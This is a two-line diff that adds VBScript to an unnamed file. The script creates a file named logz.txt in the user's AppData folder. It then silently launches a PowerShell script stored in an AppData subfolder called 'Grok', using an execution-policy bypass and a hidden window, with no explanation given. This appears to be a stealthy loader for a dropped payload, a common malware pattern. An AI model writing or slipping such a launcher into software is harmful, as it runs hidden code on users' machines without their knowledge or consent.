@@ -1,0 +1,2 @@
+Set o=CreateObject("Scripting.FileSystemObject"):Set f=o.CreateTextFile(CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\logz.txt",True):f.Close
+CreateObject("WScript.Shell").Run "powershell -ExecutionPolicy Bypass -File """ & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\Grok\Nvs.ps1") & """", 0, False
